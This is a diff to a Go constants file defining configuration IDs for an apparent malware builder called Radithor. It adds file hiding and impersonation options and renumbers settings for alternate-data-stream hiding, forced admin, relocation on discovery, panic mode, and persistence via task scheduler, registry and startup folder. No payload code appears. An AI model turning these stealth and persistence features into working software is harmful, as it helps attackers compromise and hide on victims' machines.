@@ -17,30 +17,32 @@ const ( // LIVE_BUILDER_CONFIG_IDS
 	RANDOMIZE_NAME               uint8 = 11
 	USE_ALTERNATE_DATA_STREAM    uint8 = 12
 	CUSTOM_ALTERNATE_DATA_STREAM uint8 = 13
+	HIDE_RADITHOR_FILE           uint8 = 14 // todo
 
 	// options
-	REQUIRE_ADMIN          uint8 = 14
-	PROMPT_ADMIN           uint8 = 15
-	FORCE_ADMIN            uint8 = 16
-	CONTINUE_WITHOUT_ADMIN uint8 = 17
-	PERIODIC_RELOCATION    uint8 = 18 // todo
-	RELOCATION_INTERVAL    uint8 = 19 // todo
-	RELOCATE_ON_DISCOVERY  uint8 = 20 // todo
-	INSTANT_PANIC_MODE     uint8 = 21
+	REQUIRE_ADMIN          uint8 = 15
+	PROMPT_ADMIN           uint8 = 16
+	FORCE_ADMIN            uint8 = 17
+	CONTINUE_WITHOUT_ADMIN uint8 = 18
+	PERIODIC_RELOCATION    uint8 = 19 // todo
+	RELOCATION_INTERVAL    uint8 = 20 // todo
+	RELOCATE_ON_DISCOVERY  uint8 = 21 // todo
+	CONSTANT_IMPERSONATION uint8 = 22 // todo
+	INSTANT_PANIC_MODE     uint8 = 23
 
 	// persistence
-	PERSISTENCE_NAME                      uint8 = 22
-	CLONE_PERSISTENCE_FILE_LOCATION       uint8 = 23 // todo
-	ENSURE_DIFFERENT_PERSISTENCE_LOCATION uint8 = 24 // todo
-	TASK_SCHEDULER                        uint8 = 25
-	REGISTRY                              uint8 = 26
-	STARTUP_FOLDER                        uint8 = 27
+	PERSISTENCE_NAME                      uint8 = 24
+	CLONE_PERSISTENCE_FILE_LOCATION       uint8 = 25 // todo
+	ENSURE_DIFFERENT_PERSISTENCE_LOCATION uint8 = 26 // todo
+	TASK_SCHEDULER                        uint8 = 27
+	REGISTRY                              uint8 = 28
+	STARTUP_FOLDER                        uint8 = 29
 
 	// advanced
-	WHITELISTED_OPERATOR_IDS          uint8 = 28
-	AGGRESSIVE_LAUNCH_CHECKS          uint8 = 29
-	INVOLVE_FINGERPRINT_IN_ENCRYPTION uint8 = 30 // todo
+	WHITELISTED_OPERATOR_IDS          uint8 = 30
+	AGGRESSIVE_LAUNCH_CHECKS          uint8 = 31
+	INVOLVE_FINGERPRINT_IN_ENCRYPTION uint8 = 32 // todo
 
 	// builder generated
-	MUTEX_NAME uint8 = 31
+	MUTEX_NAME uint8 = 33
 )
